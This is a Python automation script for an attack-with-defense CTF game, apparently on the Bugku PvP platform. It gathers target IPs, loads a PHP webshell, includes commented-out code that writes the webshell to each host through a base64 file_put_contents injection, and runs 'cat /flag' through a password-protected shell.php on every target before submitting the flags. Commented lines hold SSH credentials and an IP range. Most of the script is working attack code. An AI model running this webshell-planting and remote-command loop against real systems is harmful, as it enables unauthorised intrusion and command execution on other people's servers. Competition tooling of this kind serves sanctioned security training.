from paramiko.client import SSHClient

from awd import *
from awd.module.exploit import Exploit


# 备份远程文件
def backupfile(hostname,username,password,remote_path,local_path="./backups"):
    backup_client = SSHBackup(hostname=hostname, username=username, password=password)

    success, message = backup_client.connect()

    if success:
        success, message = backup_client.backup(remote_path=remote_path, local_backup_path=local_path)
        print(message)
        backup_client.disconnect()


def ipsave(ips,filename="ip_list.txt"):
    with open(filename,"w") as f:
        for ip in ips:
            f.write(ip+"\n")

def get_shell_content(filename):
    with open("./awd/webshells/"+filename,"r") as f:
        return f.read()

def format_url(ip,port):
    return "http://{}:{}/".format(ip,port)
if __name__ == "__main__":
    # backupfile("219.217.199.214","kali","kali","/var/www/html")

    ip_reader = IPReader()

    # 获取存活主机ip
    # ip_results = ip_reader.fetch_ips(method="scan", network="219.217.199.0/24")

    # 自定义ip
    # ip_results = ip_reader.fetch_ips(method="scan", is_custom=True, custom_format="192-168-1-X.pvp4682.bugku.cn")

    # 从文件获取ip
    ip_results = ip_reader.fetch_ips(method="file", ip_file="ip_list.txt")

    # 解析CIDR获取ip
    # ip_results = ip_reader.fetch_ips(method="cidr", cidr="192.168.56.91/24")

    # 保存ip至文件
    # print(ip_results)
    # ipsave(ip_results,"ip_list.txt")

    # 处理ip
    urls = [format_url(ip,"8300") for ip in ip_results]



    shell_content = get_shell_content("pass_shell.php")


    # for url in urls:
    #     print(url)


        # 写马
        # shell_writer = WebShellWriter(url=url, webshell_path="shell.php", payload=shell_content)

        # mode1: file_put_contents base64 写马
        # parameter 是目标文件中可执行命令的参数（eval）
        # status, message = shell_writer.write_shell( write_mode=1,parameter="code")
        # print(status, message)

    flags = []

    # 攻击
    for url in urls:
        print(url)
        webshell_path = "shell.php"
        exploit = Exploit(target_url = url+webshell_path,password="qyzy",parameter="cmd")
        res = exploit.execute("cat /flag")
        print(res)
        if (exploit.extract_flag(res)):
            flags.append(exploit.extract_flag(res)[0])
    print(flags)


    # 提交

    token = "<TOKEN>"
    submit_url = "https://ctf.bugku.com/pvp/submit.html?token={}&flag=".format(token)

    submit = Submit(url=submit_url,token=token)
    for flag in flags:
        submit.submit(flag)




